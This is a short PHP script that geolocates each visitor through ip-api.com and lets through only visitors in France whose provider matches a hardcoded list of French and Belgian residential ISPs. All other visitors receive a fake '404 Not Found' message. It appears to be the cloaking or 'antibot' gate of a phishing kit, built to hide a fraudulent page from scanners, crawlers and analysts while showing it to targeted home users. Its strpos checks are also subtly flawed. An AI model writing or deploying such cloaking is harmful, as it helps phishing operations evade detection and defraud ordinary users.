<?php 

include('config.php');

    if(!isset($_SESSION)){
        session_start();  // Et on ouvre la session
    } 


if($test_mode){
  $ip = "128.78.14.206";
}
else{
  $ip = $_SERVER['REMOTE_ADDR']; 
}



function getIpInfo($ip = '') { 
  
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip); 
    $ipinfo_json = json_decode($ipinfo, true); 

    return $ipinfo_json; 
} 
    if($test_mode){
      $visitor_ip = "128.78.14.206";

    }
    else{
      $visitor_ip = $_SERVER['REMOTE_ADDR']; 
    }
    $ipinfo_json = getIpInfo($visitor_ip); 



  if($ipinfo_json['status'] != 'fail'){

    $org = $ipinfo_json['as']; // On récupère l'oprateur
    $isps = $ipinfo_json['isp']; // La même
    $country = $ipinfo_json['country']; // On récupère le pays

  }
  else{

    $org = "Introuvable";
    $isps = "Introuvable";
    $country = "Introuvable";

  }

if($country == "France" || $visitor_ip == "127.0.0.1")
{
  if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $visitor_ip == "127.0.0.1") {

  } 
  else{ 
  
    die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country); 
  }
}else{
  die('HTTP/1.0 404 Not Found - ' . $country); 
}

?>